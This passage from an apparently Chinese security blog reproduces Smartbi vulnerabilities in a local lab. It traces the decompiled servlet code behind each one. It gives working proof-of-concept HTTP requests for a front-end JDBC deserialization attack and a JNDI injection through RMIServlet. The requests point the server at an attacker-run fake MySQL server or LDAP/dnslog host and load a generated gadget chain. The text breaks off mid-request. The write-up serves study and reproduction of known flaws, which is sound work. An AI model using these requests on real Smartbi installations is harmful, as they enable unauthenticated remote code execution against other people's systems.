href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol><li>根据依赖版本确定存在漏洞</li><li>根据依赖的敏感函数找入口点</li></ol><h2 id="前台JDBC反序列化"><a href="#前台JDBC反序列化" class="headerlink" title="前台JDBC反序列化"></a>前台JDBC反序列化</h2><h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>        <span class="hljs-type">File</span> <span class="hljs-variable">tmpFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">actionType</span> <span class="hljs-operator">=</span> StringUtil.getLanguageValue(<span class="hljs-string">&quot;Synchronization&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>                request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>                response.setBufferSize(<span class="hljs-number">4096</span>);<br>                <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>                    <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>                    <span class="hljs-comment">//从请求中提取数据库连接配置和查询语句</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                    log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>                    &#125;<br></code></pre></td></tr></table></figure><p>跟进 synchronize</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncResources</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//调用 DbUtil.getConnection() 获取数据库连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>            <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>            <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>跟进 DbUtil.getConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DbUtil</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//将传入的 dbType 字符串转为大写并在 DBType 中查找；如果输入非法，抛出异常并返回 null</span><br>            driverType = DBType.valueOf(dbType.toUpperCase());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//translateDriverInfo() 方法：根据数据库类型、服务器地址、数据库名,生成数据库连接配置，如：&quot;jdbc:db2://&quot; + serverName + &quot;/&quot; + dbName</span><br>        String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>        <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//创建 DefaultConnectionInfo 实例，用于表示连接信息</span><br>            <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>            info.setId(UUIDGenerator.generate());<br>            info.setName(connName);<br>            info.setDriverType(driverType);<br>            info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>            info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>            info.setUser(dbUser);<br>            info.setPassword(dbPass);<br>            <span class="hljs-comment">//获取数据库连接</span><br>            <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>        String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">switch</span> (dbType) &#123;<br>            <span class="hljs-keyword">case</span> DB2:<br>            <span class="hljs-keyword">case</span> DB2_400:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> DB2_V9:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> INFORMIX:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.informix.jdbc.IfxDriver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = serverName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-keyword">case</span> INFOBRIGHT:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (dbEncoding == <span class="hljs-literal">null</span>) &#123;<br>                    dbEncoding = <span class="hljs-string">&quot;GBK&quot;</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;mysqlCluster=true&quot;</span>.equals(dbType.getProp())) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql:loadbalance://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;autoReconnect=true&amp;roundRobinLoadBalance=true&amp;failOverReadOnly=false&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;useOldAliasMetadataBehavior=true&amp;useUnicode=true&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MSSQL:<br>                ......<br></code></pre></td></tr></table></figure><p>漏洞点产生在 <code>translateDriverInfo</code> ，此处可以拼接恶意数据库</p><h3 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>构造POC：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbNameO<span class="hljs-attr">nly</span><span class="hljs-operator">=</span>false<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>MYSQL<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>[本机IP]:<span class="hljs-number">3308</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>d5a442d?detectCustomC<span class="hljs-attr">ollations</span><span class="hljs-operator">=</span>true<span class="hljs-variable">&amp;</span>autoD<span class="hljs-attr">eserialize</span><span class="hljs-operator">=</span>yes<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/SyncServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">138</span><br><br><span class="hljs-attribute">type</span>=sqldictsync&amp;dbNameOnly=false&amp;dbType=MYSQL&amp;dbServer=[本机IP]:<span class="hljs-number">3308</span>&amp;dbName=d5a442d?detectCustomCollations=true%<span class="hljs-number">26</span>autoDeserialize=yes<br></code></pre></td></tr></table></figure><p>同样的，开启3308端口，搭建FakeMysql服务器，生成K1链</p><p>成功利用：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702529.png" alt="20250806181941863"></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702526.png" alt="20250806192734078"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//如果数据库连接url是以JDNI开头</span><br><span class="hljs-keyword">if</span> (info.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>    <span class="hljs-comment">//去掉 JNDI 部分，保留后边部分，然后用 cxt.lookup 查找并返回 DataSource</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(info.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>    <span class="hljs-keyword">return</span> dataSource.getConnection();<br></code></pre></td></tr></table></figure><h3 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>POC：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">5</span>E67682266D39E9F1475ADA74B62E102<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">466</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://[ip]:15089/bb4e07&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703762.png" alt="20250806192146688"></p><p>生成K1链：</p><p>ldap:&#x2F;&#x2F;[ip]:15089&#x2F;bb4e07</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703873.png" alt="20250806192251404"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703089.png" alt="20250806191933929"></p><p>这里因为端口的问题没有利用成功。报错LDAP服务器未响应</p><p>Windows 系统<strong>将 50389 端口作为排除范围</strong>，不允许程序（包括 Docker）绑定使用它。安装JavaChains 时将 <code>  -p 50389:50389 ^</code>改成了  <code>-p 15089:50389 ^</code>，可能监听不到，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703075.png" alt="20250806190250099"></p><p>使用dnslog</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Referer</span>: http://localhost:<span class="hljs-number">18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">3</span>D904649DC50813C9D6EDEBC582EE4CF<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">457</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span 